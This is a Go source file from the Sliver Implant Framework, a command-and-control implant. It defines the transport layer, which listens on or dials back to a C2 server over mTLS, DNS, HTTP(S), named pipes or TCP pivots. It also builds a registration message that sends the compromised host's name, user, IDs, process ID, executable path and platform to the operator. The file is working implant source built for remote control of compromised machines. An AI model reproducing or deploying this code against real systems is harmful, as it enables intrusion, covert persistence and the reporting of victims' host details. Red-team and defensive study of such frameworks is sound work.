package transports

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"errors"
	"fmt"
	"net"
	"net/url"
	"os"
	"os/user"
	"runtime"
	"strings"
	"time"

	"github.com/golang/protobuf/proto"

	"github.com/bishopfox/sliver/protobuf/commpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/bishopfox/sliver/sliver/comm"
	consts "github.com/bishopfox/sliver/sliver/constants"
	"github.com/bishopfox/sliver/sliver/version"
)

// Transport - A wrapper around a physical connection, embedding what is necessary to perform
// connection multiplexing, and RPC layer management around these muxed logical streams.
type Transport struct {
	ID        uint32
	Type      commpb.HandlerType // Direction of communications
	URL       *url.URL           // URL is used by Sliver's code for CC servers.
	maxErrors int                // Errors allowed
	attempts  int                // Attempts are reset once max errors is reached and exit.

	// conn - A physical connection initiated by/on behalf of this transport.
	// From this conn will be derived one or more streams for different purposes.
	// Sometimes this conn is not a proper physical connection (like yielded by net.Dial)
	// but it nonetheless plays the same role. This conn can be nil if the underlying
	// "physical connection" does not yield a net.Conn.
	Conn net.Conn

	// The RPC layer added around a net.Conn stream, used by implant to talk with the server.
	// It is either setup on top of physical conn, or of a muxed stream.
	// It can be nil if the Transport is tied to a pivoted implant.
	// If the Transport is the ActiveConnection to the C2 server, this cannot
	// be nil, as all underlying transports allow to register a RPC layer.
	C2 *Connection

	// Comm - Each transport over which a Session Connection (above) is working also
	// has a Comm system object, that is referenced here so that when the transport
	// is cut/switched/close, we can close the Comm subsystem and its connections.
	Comm *comm.Comm
}

// NewTransport - Eventually, we should have all supported transport transports being
// instantiated with this function. It will perform all filtering and setup
// according to the complete URI passed as parameter, and classic templating.
func NewTransport(url *url.URL) (t *Transport, err error) {
	t = &Transport{
		ID:  newID(),
		URL: url,
	}

	// Depending on the specified (or not) handler type, we set the transport direction.
	scheme := strings.Split(url.Scheme, "+")
	// If two parts, normally we have bind or reverse
	if len(scheme) == 2 {
		if scheme[0] == commpb.HandlerType_Bind.String() {
			t.Type = commpb.HandlerType_Bind
		}
		if scheme[0] == commpb.HandlerType_Reverse.String() {
			t.Type = commpb.HandlerType_Reverse
		}
	}

	// If one part and that part is a protocol, automatically use reverse
	invalidType := scheme[0] != commpb.HandlerType_Bind.String() && scheme[0] != commpb.HandlerType_Reverse.String()
	if len(scheme) == 1 && invalidType {
		t.Type = commpb.HandlerType_Reverse
	}

	// Default max errors
	t.maxErrors = maxErrors

	// {{if .Config.Debug}}
	log.Printf("New transport (Type: %s, CC= %s)", t.Type.String(), url.String())
	// {{end}}
	return
}

// start - The transport either listens (bind) on an address and blocks until the implant RPC session
// is established, or it dials (reverse) the server back and also sets the implant RPC session before return.
func (t *Transport) start() (err error) {
	switch t.Type {
	case commpb.HandlerType_Bind:
		return t.startBind()
	case commpb.HandlerType_Reverse:
		return t.startReverse()
	}
	return errors.New("invalid transport direction")
}

// startBind - When the transport is a bind one, we start to listen over the given URL
// and transport protocol. Each listening function is blocking and sets the RPC layer
// on its own, before returning either a working implant connection, or an error.
func (t *Transport) startBind() (err error) {

	// {{if .Config.Debug}}
	log.Printf("Listening (bind) on %s (%s)", t.URL.Host, t.URL.Scheme)
	// {{end}}

ConnLoop:
	for t.attempts < t.maxErrors {
		switch t.URL.Scheme {
		// {{if .Config.MTLSc2Enabled}}
		case "mtls":
			// {{if .Config.Debug}}
			log.Printf("Listening on %s", t.URL.Host)
			// {{end}}

			t.C2, err = listenMTLS(t.URL)
			if err != nil {
				// {{if .Config.Debug}}
				log.Printf("[mtls] Connection failed: %s", err)
				// {{end}}
				t.attempts++
			}
			break ConnLoop
			// {{end}} - MTLSc2Enabled

		case "namedpipe", "named_pipe", "pipe":
			// {{if .Config.NamePipec2Enabled}}
			t.C2, err = namedPipeListen(t.URL)
			if err != nil {
				// {{if .Config.Debug}}
				log.Printf("[namedpipe] Connection failed: %s", err)
				// {{end}}
				t.attempts++
			}
			break ConnLoop
			// {{end}} -NamePipec2Enabled
		default:
			break ConnLoop // Avoid ConnLoop not used
		}
	}

	if t.C2 == nil {
		// {{if .Config.Debug}}
		log.Printf("Failed to connect over bind (listener) transport %d (%s)", t.ID, t.URL)
		// {{end}}
		return
	}

	// {{if .Config.Debug}}
	log.Printf("Transport %d set up and running (%s)", t.ID, t.URL)
	// {{end}}

	return
}

// startReverse - The implant dials back a C2 server.
func (t *Transport) startReverse() (err error) {

	// {{if .Config.Debug}}
	log.Printf("Connecting (reverse) -> %s (%s)", t.URL.Host, t.URL.Scheme)
	// {{end}}

ConnLoop:
	for t.attempts < t.maxErrors {

		// We might have several transport protocols available, while some
		// of which being unable to do stream multiplexing (ex: mTLS + DNS):
		// we directly set up the C2 RPC layer here when needed, and we will
		// skip the mux part below if needed.
		switch t.URL.Scheme {
		// {{if .Config.MTLSc2Enabled}}
		case "mtls":
			// {{if .Config.Debug}}
			log.Printf("Connecting -> %s", t.URL.Host)
			// {{end}}

			t.C2, err = mtlsConnect(t.URL)
			if err != nil {
				// {{if .Config.Debug}}
				log.Printf("[mtls] Connection failed: %s", err)
				// {{end}}
				t.attempts++
			}
			break ConnLoop
			// {{end}} - MTLSc2Enabled
		case "dns":
			// {{if .Config.DNSc2Enabled}}
			t.C2, err = dnsConnect(t.URL)
			if err != nil {
				// {{if .Config.Debug}}
				log.Printf("[dns] Connection failed: %s", err)
				// {{end}}
				t.attempts++
			}
			break ConnLoop
			// {{end}} - DNSc2Enabled
		case "https":
			fallthrough
		case "http":
			// {{if .Config.HTTPc2Enabled}}
			t.C2, err = httpConnect(t.URL)
			if err != nil {
				// {{if .Config.Debug}}
				log.Printf("[%s] Connection failed: %s", t.URL.Scheme, err.Error())
				// {{end}}
				t.attempts++
			}
			break ConnLoop
			// {{end}} - HTTPc2Enabled
		case "namedpipe":
			// {{if .Config.NamePipec2Enabled}}
			t.C2, err = namedPipeDial(t.URL)
			if err != nil {
				// {{if .Config.Debug}}
				log.Printf("[namedpipe] Connection failed: %s", err)
				// {{end}}
				t.attempts++
			}
			break ConnLoop
			// {{end}} -NamePipec2Enabled
		case "tcppivot":
			// {{if .Config.TCPPivotc2Enabled}}
			t.C2, err = tcpPivotConnect(t.URL)
			if err != nil {
				// {{if .Config.Debug}}
				log.Printf("[tcppivot] Connection failed: %s", err)
				// {{end}}
				t.attempts++
			}
			break ConnLoop
			// {{end}} -TCPPivotc2Enabled
		default:
			err = fmt.Errorf("Unknown c2 protocol: %s", t.URL.Scheme)
			// {{if .Config.Debug}}
			log.Printf(err.Error())
			// {{end}}
			return
		}
	}

	if t.C2 == nil {
		// {{if .Config.Debug}}
		log.Printf("Failed to start transport %d (%s)", t.ID, t.URL)
		// {{end}}
		return
	}

	// {{if .Config.Debug}}
	log.Printf("Transport %d set up and running (%s)", t.ID, t.URL)
	// {{end}}
	return
}

// Stop - Gracefully shutdowns all components of this transport. The force parameter is used in case
// we have a mux transport, and that we want to kill it even if there are pending streams in it.
func (t *Transport) Stop() (err error) {

	// {{if .Config.Debug}}
	log.Printf("Closing transport %d (CC: %s)", t.ID, t.URL.String())
	// {{end}}

	// Close the RPC connection per se.
	if t.C2 != nil {
		t.C2.Cleanup()
	}

	// Just check the physical connection is not nil and kill it if necessary.
	if t.Conn != nil {
		// {{if .Config.Debug}}
		log.Printf("killing physical connection (%s  ->  %s", t.Conn.LocalAddr(), t.Conn.RemoteAddr())
		// {{end}}
		return t.Conn.Close()
	}

	// {{if .Config.Debug}}
	log.Printf("Transport closed (%s)", t.URL.String())
	// {{end}}
	return
}

func (t *Transport) registerSliver() *sliverpb.Envelope {
	hostname, err := os.Hostname()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Failed to determine hostname %s", err)
		// {{end}}
		hostname = ""
	}
	currentUser, err := user.Current()
	if err != nil {

		// {{if .Config.Debug}}
		log.Printf("Failed to determine current user %s", err)
		// {{end}}

		// Gracefully error out
		currentUser = &user.User{
			Username: "<< error >>",
			Uid:      "<< error >>",
			Gid:      "<< error >>",
		}

	}
	filename, err := os.Executable()
	// Should not happen, but still...
	if err != nil {
		//TODO: build the absolute path to os.Args[0]
		if 0 < len(os.Args) {
			filename = os.Args[0]
		} else {
			filename = "<< error >>"
		}
	}

	// Additional network info
	var remoteAddr string
	if t.Conn != nil {
		remoteAddr = t.Conn.LocalAddr().String()
	}

	data, err := proto.Marshal(&sliverpb.Register{
		Name:              consts.SliverName,
		Hostname:          hostname,
		Username:          currentUser.Username,
		Uid:               currentUser.Uid,
		Gid:               currentUser.Gid,
		Os:                runtime.GOOS,
		Version:           version.GetVersion(),
		Arch:              runtime.GOARCH,
		Pid:               int32(os.Getpid()),
		Filename:          filename,
		ActiveC2:          t.URL.String(),
		ReconnectInterval: uint32(GetReconnectInterval() / time.Second),
		ProxyURL:          GetProxyURL(),

		// Network & transport information.
		Transport:  t.URL.Scheme,
		RemoteAddr: remoteAddr,
	})
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Failed to encode register msg %s", err)
		// {{end}}
		return nil
	}
	return &sliverpb.Envelope{
		Type: sliverpb.MsgRegister,
		Data: data,
	}
}
